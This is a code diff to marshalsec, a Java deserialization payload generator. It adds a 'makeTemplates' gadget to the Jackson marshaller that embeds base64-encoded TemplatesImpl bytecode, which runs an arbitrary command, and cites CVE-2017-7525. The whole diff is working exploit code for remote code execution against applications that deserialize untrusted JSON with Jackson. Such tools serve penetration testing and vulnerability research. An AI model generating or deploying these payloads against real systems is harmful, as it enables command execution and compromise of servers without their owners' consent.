@@ -23,6 +23,7 @@ SOFTWARE.
 package marshalsec;
 
 
+import java.util.Base64;
 import java.util.Collections;
 import java.util.HashSet;
 import java.util.LinkedHashMap;
@@ -43,7 +44,10 @@ import marshalsec.gadgets.C3P0WrapperConnPool;
 import marshalsec.gadgets.JdbcRowSet;
 import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
 import marshalsec.gadgets.SpringPropertyPathFactory;
+import marshalsec.gadgets.Templates;
+import marshalsec.gadgets.TemplatesUtil;
 import marshalsec.gadgets.UnicastRemoteObjectGadget;
+import marshalsec.util.Reflections;
 
 
 /**
@@ -51,7 +55,7 @@ import marshalsec.gadgets.UnicastRemoteObjectGadget;
  *
  */
 public class Jackson extends MarshallerBase<String> implements JdbcRowSet, SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor,
-        C3P0RefDataSource, C3P0WrapperConnPool, UnicastRemoteObjectGadget {
+        C3P0RefDataSource, C3P0WrapperConnPool, UnicastRemoteObjectGadget, Templates {
 
     /**
      * {@inheritDoc}
@@ -163,6 +167,29 @@ public class Jackson extends MarshallerBase<String> implements JdbcRowSet, Sprin
     @Args ( minArgs = 0, args = {}, noTest = true ) // random port only
     public Object makeUnicastRemoteObject ( UtilFactory uf, String... args ) throws Exception {
         return writeObject("java.rmi.server.UnicastRemoteObject", Collections.EMPTY_MAP);
+    }
+
+
+    @Override
+    @Args ( minArgs = 1, args = {
+        "cmd", "args..."
+    }, defaultArgs = {
+        MarshallerBase.defaultExecutable
+    }, noTest = true ) // this should only work with < JDK 8u45 OR if upstream xalan is present (set upstreamXalan=true)
+    // this is likely the original gadget reported for Jackson bug #1599
+    // also described by https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
+    public Object makeTemplates ( UtilFactory uf, String... args ) throws Exception {
+        Object tpl = TemplatesUtil.createTemplatesImpl(args);
+        byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
+        Map<String, String> values = new LinkedHashMap<>();
+        String base64 = Base64.getEncoder().encodeToString(bytecodes[ 0 ]);
+        values.put("transletBytecodes", writeArray(quoteString(base64)));
+        values.put("transletName", quoteString("foo"));
+        values.put("outputProperties", "{}");
+        if ( Boolean.parseBoolean(System.getProperty("upstreamXalan", "false")) ) {
+            return writeObject("org.apache.xalan.xsltc.trax.TemplatesImpl", values);
+        }
+        return writeObject("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", values);
     }
 
 
